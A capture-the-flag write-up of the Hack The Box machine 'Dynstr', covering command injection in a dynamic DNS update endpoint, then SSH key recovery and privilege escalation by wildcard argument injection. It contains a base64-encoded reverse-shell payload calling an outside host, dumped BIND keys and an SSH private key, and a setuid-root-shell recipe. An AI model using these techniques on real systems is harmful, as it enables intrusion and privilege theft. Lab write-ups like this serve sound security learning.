> Author: **[jkr][author-profile]**

## Discovery

### Port scanning

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA)
|   256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA)
|_  256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Dyna DNS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
PORT      STATE         SERVICE
53/udp    open          domain
10080/udp open|filtered amanda
```

### CVEs

Bind 9.16 has one outstanding vulnerability: CVE-2020-8625, a buffer overflow.

Still there are no public exploits it looks rather tedious to pull off.

Let's move on.

### Browsing the website

There are leaks right in the middle of the front page:

![][leaks]

Digging the DNS server for each domain returns nothing:

```
no-ip.htb.      60  IN  SOA dns1.dyna.htb. hostmaster.dyna.htb. 2021030306 21600 3600 604800 60
no-ip.htb.      60  IN  NS  dns1.dyna.htb.
```

And browsing each domain doesn't

### Enumeration

And subdomain / directories enumeration fails too:

```bash
/assets               (Status: 301) [Size: 305] [--> http://dyna.htb/assets/]
/server-status        (Status: 403) [Size: 273]
/nic                  (Status: 301) [Size: 302] [--> http://dyna.htb/nic/]
```

I expected to find the beta service in a `dev` / `beta` / `v1` subdomain or the
like, but gobuster found nothing.

`/server-status` is forbidden and `/nic` is empty too...

Since we're totally empty-handed, let's iterate on those 2 directories!

## Break-in

### Exploring the dynamic DNS API

The page `/nic/update` only content is `badauth`: finally the place to test
the leaked credentials!

```bash
curl -i -s -k -X $'GET' \
    -H $'Host: dyna.htb'\
    -H $'Accept-Encoding: gzip, deflate' \
    --basic -u $'dynadns:sndanyd' \
    $'http://dyna.htb/nic/update'
# HTTP/1.1 200 OK
# Date: Tue, 14 Sep 2021 15:57:11 GMT
# Server: Apache/2.4.41 (Ubuntu)
# Content-Length: 18
# Content-Type: text/html; charset=UTF-8

# nochg 10.10.16.34
```

`nochg` is a return code of the [No-IP API][no-ip-doc]:

```html
nochg IP_ADDRESS    Success     IP address is current, no update performed. Followed by a space and the IP address that it is currently set to.
...
badauth             Error       Invalid username password combination.
```

A legit DNS update request looks like:

```
GET /nic/update?hostname=dynamicdns.no-ip.htb&myip=1.2.3.4 HTTP/1.1
Host: dyna.htb
Authorization: Basic ZHluYWRuczpzbmRhbnlk
User-Agent: noleak
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
```

And a fuzzed query returns:

```
911 [nsupdate failed]
```

So the page seems to run the `nsupdate` binary! With luck this is a flavor
or a system call.

Forgetting about the security, this makes sense, according to [Wikipedia][wikipedia-dnr]:

```
A registry operator, sometimes called a network information center (NIC),
maintains all administrative data of the domain and generates a zone file
which contains the addresses of the nameservers for each domain.
```

### GTFO nsupdate!

#### The query syntax

So the idea is to wrap the nsupdate command to run our own.
According to the doc, that command should look like:

```
nsupdate reads input from filename or standard input. Each command is supplied on exactly one line of input.
...
# nsupdate
> update delete oldhost.example.com A
> update add newhost.example.com 86400 A 172.16.1.1
> send
```

#### Finding legit arguments

The parameter `hostname` is filtered, it rejects most of my inputs:

```
dynamicdns.htb => 911 [wrngdom: htb]
no-ip.htb => 911 [wrngdom: htb]
heyhey.dyna.htb => 911 [wrngdom: dyna.htb]
heyhey.apehex.here.dyna.htb => 911 [wrngdom: apehex.here.dyna.htb]
```

It looks like the parameter hostname is cut at the `.` and the server gathers
everything but the first field as the hostname.

`dynamicdns.htb` and `no-ip.htb` from the leaked domains satisfy the server:

```bash
curl -i -s -k -G \
    -H $'Host: dyna.htb'\
    -H $'Accept-Encoding: gzip, deflate' \
    --basic -u $'dynadns:sndanyd' \
    --data-urlencode $'hostname=heyhey.dynamicdns.htb' \
    --data-urlencode $'myip=1.2.3.4' \
    $'http://dyna.htb/nic/update'
# HTTP/1.1 200 OK
# Date: Wed, 15 Sep 2021 07:17:44 GMT
# Server: Apache/2.4.41 (Ubuntu)
# Content-Length: 13
# Content-Type: text/html; charset=UTF-8

# good 1.2.3.4
```

To accelerate the testing process I moved this in a bash script:

```bash
./fuzz.sh $'heyhey'
# HTTP/1.1 200 OK
# Date: Wed, 15 Sep 2021 07:55:52 GMT
# Server: Apache/2.4.41 (Ubuntu)
# Content-Length: 13
# Content-Type: text/html; charset=UTF-8

# good 1.2.3.4
```

### Breaking out

With `";` in the hostname, the server displays the command instead of executing it:

```
server 127.0.0.1
zone dynamicdns.htb
update delete
good 1.2.3.4
```

From this output we gather:

- the first 3 lines are the actual query, formed from the input
- the last line is the custom feedback from the server (different from nsupdate output)
- the subdomain `";` (empty since it breaks the command) appears on the third
  line, which is incomplete

These 3 lines are somehow passed on to nsupdate: may-be through a pipe, may-be
through a file.

After an embarassing amount of fuzzing I finally broke out with:

```bash
./fuzz.sh $'"|echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjIuMy40Lzk5OTkgMD4mMQ== |base64 -d|bash;'
```

In the end, the update page logic is:

```php
<?php
  // Check authentication
  if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']))      { echo "badauth\n"; exit; }
  if ($_SERVER['PHP_AUTH_USER'].":".$_SERVER['PHP_AUTH_PW']!=='dynadns:sndanyd') { echo "badauth\n"; exit; }

  // Set $myip from GET, defaulting to REMOTE_ADDR
  $myip = $_SERVER['REMOTE_ADDR'];
  if ($valid=filter_var($_GET['myip'],FILTER_VALIDATE_IP))                       { $myip = $valid; }

  if(isset($_GET['hostname'])) {
    // Check for a valid domain
    list($h,$d) = explode(".",$_GET['hostname'],2);
    $validds = array('dnsalias.htb','dynamicdns.htb','no-ip.htb');
    if(!in_array($d,$validds)) { echo "911 [wrngdom: $d]\n"; exit; }
    // Update DNS entry
    $cmd = sprintf("server 127.0.0.1\nzone %s\nupdate delete %s.%s\nupdate add %s.%s 30 IN A %s\nsend\n",$d,$h,$d,$h,$d,$myip);
    system('echo "'.$cmd.'" | /usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key',$retval);
    // Return good or 911
    if (!$retval) {
      echo "good $myip\n";
    } else {
      echo "911 [nsupdate failed]\n"; exit;
    }
  } else {
    echo "nochg $myip\n";
  }
?>
```

So in essence my payload for triggering:

```bash
echo "some query string"|echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjIuMy40Lzk5OTkgMD4mMQ==|base64 -d|bash;
```

And `echo a |echo b` just returns "b".

## Getting user

The key for nsupdate might come in handy:

```bash
cat /etc/bind/ddns.key
# key "ddns-key" {
#     algorithm hmac-sha256;
#     secret "K8VF/NCIy5K4494l2w09Kib7oEcjdjdF7m4dXSI8vhI=";
# };
cat /etc/bind/infra.key
# key "infra-key" {
#     algorithm hmac-sha256;
#     secret "7qHH/eYXorN2ZNUM1dpLie5BmVstOw55LgEeacJZsao=";
# };
hashcat --help |grep -ia 'hmac'
# 1450 | HMAC-SHA256 (key = $pass)                           | Raw Hash, Authenticated
# 1460 | HMAC-SHA256 (key = $salt)                           | Raw Hash, Authenticated
```

But my cracking box is not available, let's keep browsing:

```bash
cat /etc/passwd | grep -v nologin
# root:x:0:0:root:/root:/bin/bash
# sync:x:4:65534:sync:/bin:/bin/sync
# dyna:x:1000:1000:dyna,,,:/home/dyna:/bin/bash
# bindmgr:x:1001:1001::/home/bindmgr:/bin/bash
```

The user flag is in `home/bindmgr`, this is the way to go. It has some juicy logs:

```bash
ls /home/bindmgr/support-case-C62796521/
# total 436K
# drwxr-xr-x 2 bindmgr bindmgr 4.0K Mar 13  2021 .
# drwxr-xr-x 5 bindmgr bindmgr 4.0K Mar 15  2021 ..
# -rw-r--r-- 1 bindmgr bindmgr 232K Mar 13  2021 C62796521-debugging.script
# -rw-r--r-- 1 bindmgr bindmgr  29K Mar 13  2021 C62796521-debugging.timing
# -rw-r--r-- 1 bindmgr bindmgr 1.2K Mar 13  2021 command-output-C62796521.txt
# -rw-r--r-- 1 bindmgr bindmgr 160K Mar 13  2021 strace-C62796521.txt
grep -ria key /home/bindmgr/support-case-C62796521/
# 15123 write(2, "Using SSH public key file '/home/bindmgr/.ssh/id_rsa.pub'\n", 58) = 58
# 15123 write(2, "Using SSH private key file '/home/bindmgr/.ssh/id_rsa'\n", 55) = 55
# 15123 read(5, "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n", 4096) = 1823
# 15123 write(2, "SSH public key authentication failed: Callback returned error\n", 62) = 62
```

Still this key requires a password... May-be the bind keys found earlier have
the same password as this ssh key, so I launched hashcat in the background.

While we're at it, let's try and use this key:

```bash
nsupdate -k /etc/bind/infra.key
```

```
> server 127.0.0.1
> zone dyna.htb
> update add apehex.infra.dyna.htb 86400 A 1.2.3.4
> show
Outgoing update query:
;; ->>HEADER<<- opcode: UPDATE, status: NOERROR, id:      0
;; flags:; ZONE: 0, PREREQ: 0, UPDATE: 0, ADDITIONAL: 0
;; ZONE SECTION:
;dyna.htb.          IN  SOA

;; UPDATE SECTION:
apehex.infra.dyna.htb.  86400   IN  A   1.2.3.4

> send
```

```
> zone 10.in-addr.arpa
> update add 4.3.2.1.in-addr.arpa 300 PTR apehex.infra.dyna.htb
> show
Outgoing update query:
;; ->>HEADER<<- opcode: UPDATE, status: NOERROR, id:      0
;; flags:; ZONE: 0, PREREQ: 0, UPDATE: 0, ADDITIONAL: 0
;; ZONE SECTION:
;10.in-addr.arpa.       IN  SOA

;; UPDATE SECTION:
4.3.2.1.in-addr.arpa. 300   IN  PTR apehex.infra.dyna.htb.

> send
```

I learnt about the zones from this file:

```bash
cat /etc/bind/named.conf.local
# // Add infrastructure DNS updates.
# include "/etc/bind/infra.key";
# zone "dyna.htb" IN { type master; file "dyna.htb.zone"; update-policy { grant infra-key zonesub ANY; }; };
# zone "10.in-addr.arpa" IN { type master; file "10.in-addr.arpa.zone"; update-policy { grant infra-key zonesub ANY; }; };
# zone "168.192.in-addr.arpa" IN { type master; file "168.192.in-addr.arpa.zone"; update-policy { grant infra-key zonesub ANY; }; };
# // Enable DynDNS updates to customer zones.
# include "/etc/bind/ddns.key";
# zone "dnsalias.htb" IN { type master; file "dnsalias.htb.zone"; update-policy { grant ddns-key zonesub ANY; }; };
# zone "dynamicdns.htb" IN { type master; file "dynamicdns.htb.zone"; update-policy { grant ddns-key zonesub ANY; }; };
# zone "no-ip.htb" IN { type master; file "no-ip.htb.zone"; update-policy { grant ddns-key zonesub ANY; }; };
```

And now the ssh doesn't ask for a password anymore!! Honestly I have 0 clue why,
being in the zone must have granted my ip some privileges?

## Escalation

The usual:

```bash
sudo -l
# User bindmgr may run the following commands on dynstr:
#     (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh
```

```bash
#!/usr/bin/bash

# This script generates named.conf.bindmgr to workaround the problem
# that bind/named can only include single files but no directories.
#
# It creates a named.conf.bindmgr file in /etc/bind that can be included
# from named.conf.local (or others) and will include all files from the
# directory /etc/bin/named.bindmgr.
#
# NOTE: The script is work in progress. For now bind is not including
#       named.conf.bindmgr.
#
# TODO: Currently the script is only adding files to the directory but
#       not deleting them. As we generate the list of files to be included
#       from the source directory they won't be included anyway.

BINDMGR_CONF=/etc/bind/named.conf.bindmgr
BINDMGR_DIR=/etc/bind/named.bindmgr

indent() { sed 's/^/    /'; }

# Check versioning (.version)
echo "[+] Running $0 to stage new configuration from $PWD."
if [[ ! -f .version ]] ; then
    echo "[-] ERROR: Check versioning. Exiting."
    exit 42
fi
if [[ "`cat .version 2>/dev/null`" -le "`cat $BINDMGR_DIR/.version 2>/dev/null`" ]] ; then
    echo "[-] ERROR: Check versioning. Exiting."
    exit 43
fi

# Create config file that includes all files from named.bindmgr.
echo "[+] Creating $BINDMGR_CONF file."
printf '// Automatically generated file. Do not modify manually.\n' > $BINDMGR_CONF
for file in * ; do
    printf 'include "/etc/bind/named.bindmgr/%s";\n' "$file" >> $BINDMGR_CONF
done

# Stage new version of configuration files.
echo "[+] Staging files to $BINDMGR_DIR."
cp .version * /etc/bind/named.bindmgr/

# Check generated configuration with named-checkconf.
echo "[+] Checking staged configuration."
named-checkconf $BINDMGR_CONF >/dev/null
if [[ $? -ne 0 ]] ; then
    echo "[-] ERROR: The generated configuration is not valid. Please fix following errors: "
    named-checkconf $BINDMGR_CONF 2>&1 | indent
    exit 44
else
    echo "[+] Configuration successfully staged."
    # *** TODO *** Uncomment restart once we are live.
    # systemctl restart bind9
    if [[ $? -ne 0 ]] ; then
        echo "[-] Restart of bind9 via systemctl failed. Please check logfile: "
    systemctl status bind9
    else
    echo "[+] Restart of bind9 via systemctl succeeded."
    fi
fi
```

First create an empty directory since the script copies all the files in the cwd:

```bash
cd $(mktemp -d)
```

Then pass the version check with:

```bash
echo 1 > .version
```

Next add a bash binary so that it will be copied to `/etc/bind/named.bindmgr/`:

```bash
cp /usr/bin/bash ./
chmod +s ./bash
sudo /usr/local/bin/bindmgr.sh
```

But the binary in `/etc/bind/named.bindmgr/` has lost the sticky bit. To keep
it, `cp` requires the flag `--preserve=mode`.

And the script runs:

```bash
cp .version * /etc/bind/named.bindmgr/
```

The wildcard is evaluated before running the command: if we add a file named
after the option, it will actually appear in the call as a flag!!

```bash
# create
echo _ > $'--preserve=mode'
sudo /usr/local/bin/bindmgr.sh
ls -lah /etc/bind/named.bindmgr/
# -rwsr-sr-x 1 root bind 1.2M Sep 15 15:00 bash
```

I love this! :)

[author-profile]: https://app.hackthebox.eu/users/77141
[leaks]: images/leaks.png
[no-ip-doc]: https://www.noip.com/integrate/response
